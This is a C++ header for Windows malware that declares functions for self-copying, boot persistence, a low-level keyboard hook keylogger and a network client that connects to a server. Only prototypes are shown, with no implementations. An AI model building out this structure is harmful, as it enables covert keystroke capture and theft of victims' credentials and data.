#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include "toolskit.hpp"
#include "csocket.hpp"

#pragma comment(lib, "WS2_32.lib")

// Replicate itself
std::string cpSelf();

// Start by boot
bool autoStart(std::string whichToAutoStart);

// Keylogger
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI KeyLogger(LPVOID lpParameter);
HANDLE startKeyLogging();

// Client
ServerInfo getServer();
DWORD WINAPI Connector(LPVOID lpParameter);
HANDLE startNetworking();